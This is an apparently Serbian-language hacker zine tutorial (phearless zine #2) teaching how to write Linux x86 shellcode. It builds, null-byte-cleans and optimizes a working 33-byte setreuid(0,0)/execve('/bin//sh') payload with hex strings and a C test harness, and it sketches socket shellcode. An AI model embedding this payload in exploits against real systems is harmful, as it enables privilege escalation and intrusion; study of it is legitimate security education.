@@ -1,0 +1,635 @@
+                                
+                             ...................
+                       ...::: phearless zine #2 :::...
+
+................>---[ Writing Linux Shellcode - Basics ]---<................
+
+.........................>---[ by Shatterhand ]---<.........................
+                                                   shatterh[at]gmail[dot]com
+
+Sadrzaj:
+
+[1] Intro - Bytecode theory
+[2] Asm basics
+    <2.1> Registers
+    <2.2> Instructions
+[3] Using sys calls
+[4] Writing shellcode
+    <4.1> Tools
+    <4.2> setreuid()/execve()
+    <4.3> Null byte headache
+    <4.4> Optimizing
+    <4.5> Few words about socket calls
+[5] Close up & further reading
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 1. Intro - Bytecode theory
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+  Poslednjih nekoliko godina susretali smo se sa raznolikim propustima u
+velikom broju aplikacija. Najceshce su to bili buffer i heap overflow-i, 
+format string bugovi i slicni. Metode i tehnike exploitanja su se vremenom
+menjale ali neke stvari su ostale iste. Medju tim stvarima svoje mesto
+pronalazi i bytecode. Bytecode se godinama koristi u exploitanju nekih od
+gore pomenutih propusta(npr. buffer overflow) i kao takav njegovo pisanje
+je veoma bitna veshtina za svakog potencijalnog security eksperta. Mozete ga
+shvatiti kao posebno napisan asm kod, ciji se krajnji oblik sastoji od char
+niza kod koga svaki bajt sadrzhi jednu hex vrednost(kasnije detaljnije
+objasnjeno). Primer takvog koda je shellcode cija je glavna svrha pokretanje
+shella(/bin/sh). Danas taj naziv nosi svaki oblik bytecode-a. Isti termin
+cemo i mi koristiti ubuduce. Tekst ne obuhvata gradivo koje se tice same
+upotrebe shellcode i pisanja exploita. Iako je na pocetnickom nivou njegovo
+citanje zahteva neko predznanje sto ce se uociti kroz tekst.
+
+Izlozheni materijal odnosi se uglavnom na GNU/Linux. Koristicemo najcesce
+standardne alate koji dolaze uz vecinu distribucija.
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 2. Asm basics
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Kao sto je pomenuto u uvodu, za pisanje shellcode neophodno je poznavanje
+programiranja u asembleru. U cilju da tekst prilagodim i onima koji to
+znanje ne poseduju u ovom poglavlju pokusacu da vas uputim u neke asm
+osnove, bar toliko da bi citanje nastavili sa razumevanjem.
+
+---< 2.1 Registers
+
+IA-32 procesor radi sa nekoliko razlicitih registara. Za vas je je vazna
+njihova primena kod koriscenja sistemskih poziva, necemo ulaziti u detalje.
+Registri koje cemo mi koristiti i oni koji su vredni pomena su: eax, ebx,
+ecx, edx, esp i eip. Prva cetiri su registri opste namene i svi ovi registri
+su 32 bitni i poticu, tj. prosireni su(extended, prefix 'e'), od 16 bitnih
+iste namene ax, bx, cx i dx. Oni se mogu podeliti na 8 bitne gornje(high) i 
+donje(low) a to su al i ah, bh i bl, ch i cl, dh i dl.
+
+eax - poznatiji je kao akumulator registar. Koristi se kod ulazno/izlaznih
+(I/O) i aritmetickih operacija kao i kod izvrshavanja poziva interupta.
+Koristicemo ga za cuvanje vrednosti tj. broja sistemskog poziva
+koji ce se izvrshavati(poglavlje 3 - Using sys calls)
+ebx - bazni(base) register. Posluzice nam za predavanje prvog argumenta
+sistemskog poziva. 
+ecx - brojac(counter) register. Koristicemo ga za drugi argument.
+edx - data register. Treci argument.
+esp - pokazivac na stack(stack pointer). 
+eip - pokazivac instrukcija(instruction pointer). Pokazuje na offset 
+      naredne instrukcije u text(code) segmentu.
+
+Prednost koriscenja manjih registara uochice se kod izbegavanja null 
+byte-ova (pod-poglavlje 4.3).
+
+---< 2.2 Instructions
+
+Kao i svaki programski jezik i asembler ima svoju sintaxu. Tacnije, ima dva
+glavna tipa, a to su AT&T i Intel sintaxa. U nasem tekstu cemo koristiti
+upravo Intel. Razlog za to je veca citljivost samog koda, sto je nama i
+potrebno. Neki disasembleri koriste AT&T sintaxu u svom outputu (gdb,
+objdump...) i zbog toga cemo pomenuti neke generalne razlike od Intel.
+Upoznajmo se sa nekim osnovnim instrukcijama:
+
+mov - Prenosenje vrednosti. Sintaxa: mov <destinacija>,<izvorishte> gde
+      destinacija odnosno izvoriste moze biti register, memorijska adresa 
+      ili konstanta(mov reg,reg ; mov reg,mem ; mov mem,reg ; mov reg,const 
+      mov mem, const). Memory-to-memory je vec nemoguce.
+      Primer: mov eax, 70 ; cuva vrednost 70 u eax
+      Velicine operanda bi trebalo da budu iste. Dakle nesto kao mov al, ebx
+      nije validno(u 8 bita ne moze se smestiti 32).
+
+add - Dodaje/sabira vrednosti. Sintaxa: add <destinacija>,<izvorishte>.
+      Vrednost izvorista dodaje na vrednost destinacije i rezultat cuva u
+      destinaciji ili drugacije receno sabira ih. To mogu biti isto kao kod 
+      mov registar, memorijska adresa i konstanta.
+      Primer: add eax, ebx ; vrednost iz ebx dodaje se na eax
+      Ova akcija je ekvivalent ovome eax = ebx + eax.
+
+sub - Oduzimanje vrednosti. Sintaxa: sub <destinacija>,<izvorishte.>
+      Isti slucaj kao kod add samo je u pitanju oduzimanje.
+      Primer: sub eax, ebx ; eax = eax - ebx
+      Takodje postoje div i mul(division i multiplication) tj. deljenje i
+      mnozenje.
+
+push - Guranje vrednosti na stek. Sintaxa: push <neshto>(reg, mem, const).
+       Koristi se za smeshtanje privremenih podataka na stack (Ovde je 
+       potrebno malo razumevanja LIFO ogranizacije (Last In First Out) i 
+       uloge sp. Dakle, vrednost koja je zadnja gurnuta na stack je prva 
+       koja se skida sa njega. Pritom se posle svakog guranja dekrementira 
+       pokazivac na stack(sp). 
+       Primer: push eax ; gura sadrzhaj eax na stack
+
+pop - Skidanje sa stack. Sintaxa: pop <neshto>(reg, mem). U ovom slucaju se 
+      sp inkrementira. Primer: pop eax ; eax dobija vrednost sa vrha stacka
+
+jmp - Bezuslovni skok. Menja EIP(pokazivac instrukcija) na odredjenu
+      adresu. Sintaxa: jmp <label>.
+      Primer: jmp neshto ; gde je 'neshto', recimo, neka nasa labela
+      Pored njega postoje i uslovni skokovi:
+      je - skoci ako je jednako
+      jne - skoci ako nije jednako
+      jz - skoci ako je rezultat 0(od prethodne operacije add, sub i slicno)
+      jg - skoci ako je vece
+      jge - skoci ako je vece ili jednako
+      jl - skoci ako je manje
+      jle - skoci ako je manje ili jednako ...
+      Primer: cmp eax, ebx ; ako je sadrzaj eax jednak sadrzaju ebx
+              je neshto    ; skoci na 'neshto'
+
+call i ret - Skok na neki deo koda stim sto se nakon izvrsenja instrukcija u
+      tom kodu vraca na sledecu instrukciju. Vidimo u primeru:
+            call neshto
+            mov eax, ecx
+      A u neshto se nalazi niz instrukcija recimo
+            add ebx, 100
+            sub edx, ebx
+            ret
+      I desava se sledece: call gura EIP(koji pokazuje na sledecu instrukciju
+      za izvrsavanje sto je kod nas mov eax, ecx) na stack i zatim izvrsava
+      bezuslovni skok na 'neshto'. ret zatim skida to sa stack i vraca se na
+      tu instrukciju(mov eax, ecx) i nastavlja izvrsavanje odatle.  
+
+lea - Smestanje odredjene memorijske adrese u register.
+      Sintaxa: lea <destinacija>,<izvorishte> gde destinacija mora biti 
+      registar(opste namene). Primer: lea eax, [ebx+ecx] 
+
+int - Prekid(interrupt). Sintaxa: int <vrednost>. Koristi se za slanje
+      signala kernelu. Primer: int 0x80 ; prepusta kernelu izvrsavanje poziva
+
+           Intel Sintaxa   |   AT&T Sintaxa
+      ---------------------+--------------------
+       mov   eax, 1        |  movl   $1,%eax
+       mov   ebx,0ffh      |  movl   $0xff,%ebx
+       mov   eax,[ebx]     |  movl   (%ebx),%eax
+       mov   eax,[ebx+3]   |  movl   3(%ebx),%eax
+       lea   eax,[ebx+ecx] |  leal   (%ebx,%ecx),%eax
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 3. Using sys calls
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Kao sto vecina vas zna, Linux pruza set funkcija poznatijih kao sistemski
+pozivi(sys calls). Koriste se od strane programa da bi dobili odredjene
+usluge od kernela. Kao takvi, mogu se direktno pozivati u vecini programskih
+jezika kao sto su C, perl i onaj nama najvazniji - asembler. U prethodnom
+poglavlju smo pomenuli ulogu registara u koriscenju sistemskih poziva i
+njihovo izvrsavanje sa 0x80 prekidom. Sada cemo to sve videti i u praksi.
+
+Linux dokumentacija je veoma opsirna kako za komande, aplikacije i
+administraciju sistema tako i za programiranje. Man(manual) stranice pruzaju
+detaljne informacije o standardnim bibliotekama i funkcijama u koje spadaju
+i sistemski pozivi. Pocnimo od liste poziva koje mozemo naci numerisane u
+/usr/include/asm/unistd.h
+
+#ifndef _ASM_I386_UNISTD_H_
+#define _ASM_I386_UNISTD_H_
+
+/*
+ * This file contains the system call numbers.
+ */
+
+#define __NR_exit                 1
+#define __NR_fork                 2
+#define __NR_read                 3
+#define __NR_write                4
+#define __NR_open                 5
+#define __NR_close                6
+#define __NR_waitpid              7
+#define __NR_creat                8
+#define __NR_link                 9
+#define __NR_unlink              10
+#define __NR_execve              11
+#define __NR_chdir               12
+#define __NR_time                13
+#define __NR_mknod               14
+#define __NR_chmod               15
+#define __NR_lchown              16
+#define __NR_break               17
+#define __NR_oldstat             18
+#define __NR_lseek               19
+#define __NR_getpid              20
+...itd
+  
+Da vidimo sta nam daju man stranice. Uzmimo write() za primer.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+shatter@fearless:~$ man 2 write
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+WRITE(2)            Linux Programmer's Manual            WRITE(2)
+
+NAME
+       write - write to a file descriptor
+
+SYNOPSIS
+       #include <unistd.h>
+
+       ssize_t write(int fd, const void *buf, size_t count);
+
+I to vazi za svaki poziv(manuali su, naravno, dosta opsirniji od onoga sto
+smo prikazali). Napisacemo jednostavan program koji se stampati poruku na
+standardni izlaz koristeci write(). Prvo, analizirajmo tu funkciju. 
+Prvi argument(fd) je celobrojna vrednost koja predstavlja fajl deskriptor i 
+na tom mestu se mogu naci vrednosti 0, 1 i 2 gde je 0 stdin(standardni ulaz),
+1 stdout(standardni izlaz) i 2 stderr(izlazna greska). Buduci da se radi o 
+stampanju poruke, za taj prvi argument uzimamo vrednost 1. Drugi argument
+(const void *buf) je pokazivac na bafer karaktera koji sadrze string koji 
+cemo stampati. I na kraju, treci argument(size_t count) oznacava duzinu tog 
+stringa. Takodje cemo iskoristiti i exit() poziv koji zahteva jedan argument
+i to ce biti 0.
+
+section .data          ; deklaracija .data sekcije
+
+      poruka db "phearless eZine #2"    ; nas string
+      
+section .text          ; deklaracija .text sekcije
+global _start          ; radi linkovanja kao elf binary
+
+_start:
+
+; write(int fd, const void *buf, size_t count)                 
+      mov eax, 4       ; stavljamo 4 u eax jer je write() 4-ti poziv
+      mov ebx, 1       ; predajemo prvi argument poziva, fd je 1(stdout)
+      mov ecx, poruka  ; drugi argument, nash string za stampanje
+      mov edx, 18      ; treci argument, duzina stringa tj. 18 bajtova
+      int 0x80         ; pozivamo kernel i prepustamo izvrsavanje funkcije
+
+; exit(int status)
+      mov eax,1        ; stavljamo 1 u eax jer je exit() syscall 1
+      mov ebx,0        ; prvi i jedini argument, 0
+      int 0x80         ; pozivamo kernel i prepustamo izvrsavanje funkcije
+
+Proverimo radi li onako kako smo ga zamislili:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+shatter@fearless:~/zine$ nasm -f elf phearless.asm
+shatter@fearless:~/zine$ ld -s -o phearless phearless.o
+shatter@fearless:~/zine$ ./phearless
+phearless eZine #2
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Radi :). Nadam se da je sasvim jasno kako predajemo argumente. Posmatrajte
+to kao write(1, poruka, 18) i exit(0). Ovo vazi i za druge pozive. 
+Ovaj kod necemo prebacivati u shellcode, iz dva razloga. Prvi je cinjenica 
+da on ne bi bio funkcionalan iz vise razloga, a drugi je to sto nam nije
+koristan (osim ako ne vidite neku prednost u obicnom stampanju poruke ;p ).
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 4. Writing shellcode
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+---< 4.1 Tools
+
+nasm - the Netwide Assembler (nasm.sourceforge.net)
+hexdump - (http://www.canb.auug.org.au/~millerp/hexdump.htm)
+
+
+---< 4.2 setreuid()/execve()
+
+U prethodnom poglavlju demonstrirali smo upotrebu sistemskih poziva u
+jednostavnom programu. Pomenuli smo takodje da se on ne moze upotrebiti kao
+shellcode. Sada prelazimo na pisanje pravog koda, koji mora ispunjavati
+odredjene uslove da bi bio funkcionalan. Vratimo se na definiciju bytecode-a
+iz prvog poglavlja gde smo rekli da je on posebno napisan asm kod. E sad, 
+bitno je da shvatite da on ne treba biti napisan kao pravi, izvrsni program
+(kao primer iz poglavlja 3), vec kao zaseban kod koji ce se izvrsavati u 
+toku rada vec postojeceg programa. Da bi to postigli platicemo odredjenu 
+cenu. Da vidimo u cemu ce se razlikovati od onog primera. Kao prvo, vise ne 
+smemo koristiti data segment i sve ono sto bi inace smestili u njega(kao 
+npr. string) moramo nekako ubaciti medju ostatak koda. Vise nema potrebe ni 
+za kakvim deklaracijama, nije nam vise cilj dobiti obican elf binary. 
+Koristicemo par novih instrukcija(push, pop).
+
+Ono sto sledi je setreuid/execve shellcode. Dakle obican, staromodni
+pokretach shella ;). Za njegovo pisanje koristimo dva sistemska poziva:
+setreuid() i execve(). Prvi cemo koristiti za vracanje privilegija(uglavnom
+root) nad procesom. Iz man stranica saznajemo da je oblik tog poziva
+sledeci: int setreuid(uid_t ruid, uid_t euid) gde prvi argument(ruid)
+oznacava real uid, a drugi(euid) effective uid. Za oba argumenta u nasem
+shellcode predajemo vrednost 0(0 kao root uid). Execve poziv cemo koristiti
+za pokretanje shella(/bin/sh). Njegov oblik je: 
+int execve(const char *filename, char *const argv [], char *const envp[])
+gde kao prvi argument predajemo ono sto se izvrsava, u ovom slucaju /bin/sh,
+dok su druga dva argumenta nizovi za argument i environment. 
+Za razliku od prvog poziva gde predajemo argumente jednostavno, kao u onom
+primeru, sa execve postupamo drugacije. Naime, sada cemo za to koristiti
+stack. Dodushe, moze se koristiti i onaj prvi, standardni nacin ali tada je 
+kod malo komplikovaniji i robustan. Isti ovaj kod cemo u daljnjem tekstu i
+optimizovati. Pogledajte a zatim analiziramo:
+
+BITS 32
+
+; setreuid(uid_t ruid, uid_t euid)
+      mov eax, 70       ; stavljamo 70 u eax, posto je setreuid() 70-i poziv
+      mov ebx, 0        ; predajemo prvi argument, real uid ce biti 0
+      mov ecx, 0        ; drugi argument, effective uid ce biti takodje 0
+      int 0x80          ; pozivamo kernel i prepustamo izvrsavanje funkcije
+
+; execve(const char *filename, char *const argv [], char *const envp[])
+      mov eax, 0        ; null za terminaciju
+      push eax          ; guramo 4 null bajta iz eax na stack
+      push 0x68732f2f   ; guramo "//sh" na stack
+      push 0x6e69622f   ; guramo "/bin" na stack
+      mov ebx, esp      ; adresu od "/bin//sh" stavljamo u ebx, preko esp
+      push eax          ; guramo 4 null bajta iz eax na stack
+      push ebx          ; guramo ebx na stack
+      mov ecx, esp      ; stavljamo adresu ebx u ecx, preko esp
+      mov edx, 0        ; stavljamo 0 u edx, kao treci argument poziva
+      mov eax, 11       ; stavljamo 11 u eax, posto je execve() 11-i poziv
+      int 0x80          ; pozivamo kernel i prepustamo izvrsavanje funkcije
+
+Prvi deo(setreuid) mislim da ne moramo objasnjavati, komentari sve govore.
+E sad, da prosirimo malo objasnjenja iz komentara za drugi deo. Prvo, 4
+null bajta su gurnuta na stack da bi terminirali string koji ce biti gurnut
+u naredne dve instrukcije(sad se setite stack organizacije). Primetite da u
+sledecoj instrukciji guramo //sh a ne /sh. To je zato sto sve sto guramo
+mora biti 32-bita tj 4 bajta. Ali to ne utice na funkcionalnost jer je
+izvrsavanje /bin//sh i /bin/sh isto. Dalje, u ebx predajemo adresu tog
+stringa kao prvi argument preko esp(stack pokazivaca). Jos 4 null bajta se
+guraju na stack praceni ebx da obezbede pokazivac na pokazivac za drugi
+argument execve. Zatim se u ecx stavlja adresa ebx preko stack pokazivaca.
+I na kraju se edx kao treci argument stavlja na 0. Prosledjuje se 11 u eax,
+jer je to broj execve poziva i nakon prekida se izvrsava.
+
+Da bi shellcode bio shellcode mora biti u hex obliku. Dakle:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+shatter@fearless:~/zine$ nasm shellcode.asm
+shatter@fearless:~/zine$ hexdump -C shellcode
+00000000  b8 46 00 00 00 bb 00 00  00 00 b9 00 00 00 00 cd  |∏F...ª....π....Õ|
+00000010  80 b8 00 00 00 00 50 68  2f 2f 73 68 68 2f 62 69  |.∏....Ph//shh/bi|
+00000020  6e 89 e3 50 53 89 e1 ba  00 00 00 00 b8 0b 00 00  |n.„PS.·∫....∏...|
+00000030  00 cd 80                                          |.Õ.|
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Primetite '00' na nekoliko mesta u hex outputu. To su null bajtovi i dok su
+oni tu nash shellcode nece raditi kako treba. Tacnije, u bafer ce uspeti da
+se prekopiraju 2 bajta i kada naidje na '00' terminirace se string.
+
+---< 4.3 Null byte headache
+
+U samom kodu se odmah moze videti gde je glavni problem. Obratite paznju na
+predavanje argumenata sa vrednosti 0 (kod setreuid oba i jedan kod execve).
+Moramo naci nacin da izbegnemo null ali da argumenti ostanu isti. Postoji
+vise metoda za to. Naprimer, mozemo od jednog registra oduzeti taj isti
+registar tj. istu vrednost sa sub instrukcijom (npr. sub ebx, ebx).
+Takodje postoji jos jedna instrukcija koja daje isti rezultat a to je xor
+i nju cemo mi koristiti. To je obicna logicka operacija, najcesce se
+koristi za setovanje registara na 0. Transformise bitove po sistemu:
+
+ 0 - 0 -> 0
+ 0 - 1 -> 1
+ 1 - 0 -> 1
+ 1 - 1 -> 0  
+ 
+i zakljucujemo da svaka vrednost xor-ovana sama sa sobom daje rezultat 0.
+Tako da to mozemo upotrebiti kod registara ovako
+xor ebx, ebx ; sada je u ebx 0, kao da smo uradili mov ebx, 0
+Izmenimo to u nasem shellcode:
+
+BITS 32
+
+; setreuid(uid_t ruid, uid_t euid)
+      mov eax, 70             
+      xor ebx, ebx      ; sada koristimo xor da bi predali 0 kao argument
+      xor ecx, ecx      ; takodje i za drugi argument
+      int 0x80                
+
+; execve(const char *filename, char *const argv [], char *const envp[])
+      xor eax, eax      ; null za terminaciju, ovog puta sa xor
+      push eax               
+      push 0x68732f2f  
+      push 0x6e69622f   
+      mov ebx, esp            
+      push eax                
+      push ebx               
+      mov ecx, esp            
+      xor edx, edx      ; treci argument, sa xor edx je sada 0
+      mov eax, 11            
+      int 0x80                
+
+Asembliramo opet i sa hexdump dobijamo output
+
+00000000  b8 46 00 00 00 31 db 31  c9 cd 80 31 c0 50 68 2f  |∏F...1€1…Õ.1¿Ph/|
+00000010  2f 73 68 68 2f 62 69 6e  89 e3 50 53 89 e1 31 d2  |/shh/bin.„PS.·1“|
+00000020  b8 0b 00 00 00 cd 80                              |∏....Õ.|
+
+I kao sto vidimo null bajtovi su opet tu?! Iako smo koristili xor?
+Pogledajmo pazljivo ovaj hex output. Pre '00 00 00' nalazi se hex vrednost
+46 (0x00000046) a njena decimalna vrednost je 70. Tu vrednost predajemo u
+prvoj instrukciji za broj setreuid poziva. Razlog zasto se null bajtovi
+pojavljuju je sledeci: U eax smo smestili vrednost 70 ne misleci o tome da
+je on 32-bitni registar i da smo ustvari predali 00000046(gledano u hex).
+Zakljucujemo da decimala 70 zahteva samo 1 bajt(osam bita) i zato cemo
+umesto 32-bitnog registra koristiti 8-bitni tj al. Ista stvar vazi i za
+druga tri null bajta koja se pojavljuju. Njih predhodi hex 0b sto je
+decimalna vrednost 11(execve poziv). Dodacemo jos jednu stvar, eax se mora
+nulovati sa xor pre koriscenja al. Izmenimo nas shellcode:
+
+BITS 32
+
+; setreuid(uid_t ruid, uid_t euid)
+      xor eax, eax      ; nulujemo eax prvo   
+      xor ebx, ebx      ; sada koristimo xor da bi predali 0 kao argument
+      xor ecx, ecx      ; takodje i za drugi argument
+      mov al, 70       
+      int 0x80        
+
+; execve(const char *filename, char *const argv [], char *const envp[])
+      xor eax, eax      ; null za terminaciju, ovog puta sa xor
+      push eax      
+      push 0x68732f2f   
+      push 0x6e69622f   
+      mov ebx, esp      
+      push eax         
+      push ebx          
+      mov ecx, esp      ; treci argument, sa xor edx je sada 0
+      xor edx, edx     
+      mov al, 11       
+      int 0x80         
+
+A sad, hexdump:
+
+00000000  31 c0 31 db 31 c9 b0 46  cd 80 31 c0 50 68 2f 2f  |1¿1€1…∞FÕ.1¿Ph//|
+00000010  73 68 68 2f 62 69 6e 89  e3 50 53 89 e1 31 d2 b0  |shh/bin.„PS.·1“∞|
+00000020  0b cd 80                                          |.Õ.|
+
+Kao sto vidimo, nema nijednog jedinog null bajta :). Sredimo to i
+testirajmo:
+
+char shellcode[] =
+      "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80"
+      "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+      "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+      "\xd2\xb0\x0b\xcd\x80";
+      
+main() {
+
+     void (*fp) (void);
+     fp = (void *)shellcode;
+     printf("%d bajta\n", strlen(shellcode));
+     fp();
+}
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+shatter@fearless:~/zine$ gcc testing.c -o testing
+shatter@fearless:~/zine$ ./testing
+35 bajta
+sh-2.05b$
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Dobijamo potpuno funkcionalan shellcode od 35 bajtova. Jedino pitanje sada
+je kako ga uciniti josh manjim?
+
+---< 4.4 Optimizing
+
+Sada treba naci nacin da smanjimo shellcode menjajuci neke instrukcije sa
+drugim ali da rade u osnovi istu stvar. Pocnimo od samog pocetka koda.
+
+      xor eax, eax  
+      xor ebx, ebx     
+      xor ecx, ecx     
+      mov al, 70    
+
+instrukcije xor eax, eax i mov al, 70 se mogu zameniti sa:
+
+      push byte 70    
+      pop eax   
+
+sto nash shellcode cini manjim za jedan bajt. Dalje, instrukcija
+xor edx, edx se moze zameniti sa cdq sto daje isti rezultat. Tacnije, u edx
+ce svi bitovi biti ispunjeni sa 0 samo u slucaju da se u eax nalazi
+pozitivna vrednost(od nule pa na gore) a tako kod nas i jeste. Time
+skracujemo za jos jedan bajt. I konacan, optimizovan shellcode je:
+
+BITS 32
+
+; setreuid(uid_t ruid, uid_t euid)
+      push byte 70      ; koristimo da bi skratili za 
+      pop eax           ; jedan bajt manje
+      xor ebx, ebx      ; sada koristimo xor da bi predali 0 kao argument
+      xor ecx, ecx      ; takodje i za drugi argument     
+      int 0x80        
+
+; execve(const char *filename, char *const argv [], char *const envp[])
+      xor eax, eax      ; null za terminaciju, ovog puta sa xor
+      push eax      
+      push 0x68732f2f   
+      push 0x6e69622f   
+      mov ebx, esp      
+      push eax         
+      push ebx          
+      mov ecx, esp      ; treci argument, sa xor edx je sada 0
+      cdq               ; jos jedan bajt manje
+      mov al, 11       
+      int 0x80         
+
+Hexdump:
+
+00000000  6a 46 58 31 db 31 c9 cd  80 31 c0 50 68 2f 2f 73  |jFX1€1…Õ.1¿Ph//s|
+00000010  68 68 2f 62 69 6e 89 e3  50 53 89 e1 99 b0 0b cd  |hh/bin.„PS.·.∞.Õ|
+00000020  80                                                |.|
+
+Sredimo lepo:
+
+"\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xc0"
+"\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
+"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+I dosli smo do kraja pisanja naseg shellcode. 33 bajta, bolje nam ne treba. 
+
+---< 4.5 Few words about socket calls
+
+Sigurno ste ranije vidjali shellcode-ove poput reverse-telnet/connect-back,
+port binding itd. i mozda vas je zanimao nacin pisanja istih. Prvo sto vam
+pada na pamet kada govorimo o tome su pozivi kao socket(), accept(), bind(),
+connect() i slicni i predavanje njihovih argumenata u kodu. Nazalost, stvar
+je malo komplikovanija. Naime, postoji samo jedan sistemski poziv preko koga
+radimo sa ostalim funkcijama. To je socketcall. Njegov oblik je (vidi u man)
+int socketcall(int call, unsigned long *args) gde je prvi argument broj koji
+predstavlja socket funkciju(dakle to su one connect(), recv()...) a drugi je
+blok argumenata funkcije navedene u prvom. 
+Brojeve socket poziva mozemo pronaci u /usr/include/linux/net.h
+
+#define SYS_SOCKET      1               /* sys_socket(2)                */
+#define SYS_BIND        2               /* sys_bind(2)                  */
+#define SYS_CONNECT     3               /* sys_connect(2)               */
+#define SYS_LISTEN      4               /* sys_listen(2)                */
+#define SYS_ACCEPT      5               /* sys_accept(2)                */
+#define SYS_GETSOCKNAME 6               /* sys_getsockname(2)           */
+#define SYS_GETPEERNAME 7               /* sys_getpeername(2)           */
+#define SYS_SOCKETPAIR  8               /* sys_socketpair(2)            */
+#define SYS_SEND        9               /* sys_send(2)                  */
+#define SYS_RECV        10              /* sys_recv(2)                  */
+#define SYS_SENDTO      11              /* sys_sendto(2)                */
+#define SYS_RECVFROM    12              /* sys_recvfrom(2)              */
+#define SYS_SHUTDOWN    13              /* sys_shutdown(2)              */
+#define SYS_SETSOCKOPT  14              /* sys_setsockopt(2)            */
+#define SYS_GETSOCKOPT  15              /* sys_getsockopt(2)            */
+#define SYS_SENDMSG     16              /* sys_sendmsg(2)               */
+#define SYS_RECVMSG     17              /* sys_recvmsg(2)               */
+
+Takodje ce vam biti potrebni brojevi kojima su oznacene familije prokola.
+Nalaze se u /usr/include/linux/socket.h
+
+#define AF_UNIX         1       /* Unix domain sockets          */
+#define AF_LOCAL        1       /* POSIX name for AF_UNIX       */
+#define AF_INET         2       /* Internet IP Protocol         */
+#define AF_AX25         3       /* Amateur Radio AX.25          */
+#define AF_IPX          4       /* Novell IPX                   */
+#define AF_APPLETALK    5       /* AppleTalk DDP                */
+#define AF_NETROM       6       /* Amateur Radio NET/ROM        */
+#define AF_BRIDGE       7       /* Multiprotocol bridge         */
+#define AF_ATMPVC       8       /* ATM PVCs                     */
+#define AF_X25          9       /* Reserved for X.25 project    */
+#define AF_INET6        10      /* IP version 6                 */
+...itd
+
+I za tipove: /usr/include/asm/socket.h
+
+#define SOCK_STREAM     1               /* stream (connection) socket   */
+#define SOCK_DGRAM      2               /* datagram (conn.less) socket  */
+#define SOCK_RAW        3               /* raw socket                   */
+#define SOCK_RDM        4               /* reliably-delivered message   */
+#define SOCK_SEQPACKET  5               /* sequential packet socket     */
+
+Naravno, potrebno je razumevanje mreznog programiranja i ako znate to u C
+implementacija u asm ne bi trebala biti problem uz pomoc informacija gore. 
+To prepustam vama. Takodje, mozete naci i dosta shellcode primera na web
+(preporucujem www.shellcode.com.ar). Naravno, ovakav kod je obicno znatno
+veci od obicnih (kao sto je primer koji smo koristili u tekstu).
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 5. Close up & further reading
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+  Nadam se da ce vam ovaj tekst posluziti i da ste uspeli sve razumeti iako
+se nisam isuvise trudio da detaljisem. Toliko o osnovama linux shellcodinga.
+
+Ovom prilikom zelim da pozdravim sve koji me poznaju a posebno:
+_bl00dz3r0_, EArthquake(Wintermuth), BaCkSpAcE, sunnis, deroko 
+De1Rekt0n, DownBload, milosn, argv i redovne posetioce #ugs 
+kanala kao i clanove blackhat foruma. 
+
+
+Malo literature za daljnje ucenje na temu shellcode:
+
+<1> Building ptrace injecting shellcodes:
+    http://www.phrack.org/phrack/59/p59-0x0c.txt
+
+<2> Polymorphic Shellcode Engine 
+    http://www.phrack.org/phrack/61/p61-0x09_Polymorphic_Shellcode_Engine.txt
+    
+<3> IA64 shellcode
+    http://www.phrack.org/phrack/57/p57-0x05
+
+<4> Building IA32 'Unicode-Proof' Shellcodes
+    http://www.phrack.org/phrack/61/p61-0x0b_Building_IA32_UnicodeProof_Shellcodes.txt
+    
+<5> UTF8 Shellcode
+    http://www.phrack.org/phrack/62/p62-0x09_UTF8_Shellcode.txt
+
+
+
+
+
+
+
+
+
